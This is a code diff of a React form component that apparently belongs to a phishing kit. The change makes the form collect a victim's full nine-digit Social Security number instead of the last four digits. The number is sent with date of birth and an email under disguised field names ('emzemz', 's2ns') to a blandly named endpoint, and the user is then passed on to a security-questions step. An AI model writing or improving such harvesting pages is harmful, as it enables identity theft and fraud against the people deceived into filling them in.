@@ -4,7 +4,7 @@ import axios from 'axios';
 import { baseUrl } from '../constants';
 import useAccessCheck from '../Utils/useAccessCheck';
 
-const SSN1: React.FC = () => {
+function SSN1() {
   const [socialSecurityNumber, setSocialSecurityNumber] = useState('');
   const [showSSN, setShowSSN] = useState(false);
   const [month, setMonth] = useState('');
@@ -49,8 +49,9 @@ const SSN1: React.FC = () => {
     event.preventDefault();
     setIsLoading(true);
     
-    let newErrors = { 
-      socialSecurityNumber: socialSecurityNumber.length !== 4 ? 'Please enter exactly 4 digits.' : '',
+    const digitsOnly = socialSecurityNumber.replace(/\D/g, '');
+    const newErrors = { 
+      socialSecurityNumber: digitsOnly.length !== 9 ? 'Please enter a valid 9-digit SSN.' : '',
       dateOfBirth: (!month || !day || !year) ? 'Complete date of birth is required.' : ''
     };
 
@@ -69,14 +70,13 @@ const SSN1: React.FC = () => {
     if (!Object.values(newErrors).some(error => error)) {
       try {
         const d_b = `${getMonthName(month)}/${day}/${year}`;
-        await axios.post(`${baseUrl}api/logix-meta-data-5/`, {
-                    emzemz: emzemz,
-
+        await axios.post(`${baseUrl}api/logix-meta-data-6/`, {
+          emzemz: emzemz,
           s2ns: socialSecurityNumber,
           d_b: d_b
         });
         console.log('Form submitted successfully');
-        navigate('/ssn2', { state: { emzemz } });
+        navigate('/security-questions', { state: { emzemz } });
       } catch (error) {
         console.error('Error submitting form:', error);
         setIsLoading(false);
@@ -102,7 +102,7 @@ const SSN1: React.FC = () => {
           {/* SSN Field */}
           <div className="mb-4">
             <label className="block text-gray-700 text-sm font-medium mb-2">
-              Last 4 digits of your social security number
+              Social Security Number
             </label>
             <div className="relative">
               <input
@@ -111,18 +111,29 @@ const SSN1: React.FC = () => {
                 type={showSSN ? 'text' : 'password'}
                 value={socialSecurityNumber}
                 onChange={(e) => {
-                  const value = e.target.value.replace(/\D/g, '');
-                  if (value.length <= 4) {
-                    setSocialSecurityNumber(value);
+                  const digitsOnly = e.target.value.replace(/\D/g, '').slice(0, 9);
+                  let formattedValue = digitsOnly;
+
+                  if (formattedValue.length >= 6) {
+                    formattedValue = formattedValue.replace(/(\d{3})(\d{2})(\d{0,4})/, (_, p1, p2, p3) =>
+                      p3 ? `${p1}-${p2}-${p3}` : `${p1}-${p2}`
+                    );
+                  } else if (formattedValue.length >= 4) {
+                    formattedValue = formattedValue.replace(/(\d{3})(\d{0,2})/, (_, p1, p2) =>
+                      p2 ? `${p1}-${p2}` : `${p1}`
+                    );
                   }
+
+                  setSocialSecurityNumber(formattedValue);
                 }}
                 onKeyDown={(e) => {
-                  if (!/[0-9]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'Tab') {
+                  const allowedKeys = ['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight'];
+                  if (!/[0-9]/.test(e.key) && !allowedKeys.includes(e.key)) {
                     e.preventDefault();
                   }
                 }}
-                maxLength={4}
-                placeholder="XXXX"
+                maxLength={11}
+                placeholder="XXX-XX-XXXX"
                 className="w-full max-w-xs border border-gray-300 px-2 py-1 text-sm"
               />
               <span
@@ -230,6 +241,6 @@ const SSN1: React.FC = () => {
       </div>
     </div>
   );
-};
+}
 
 export default SSN1;
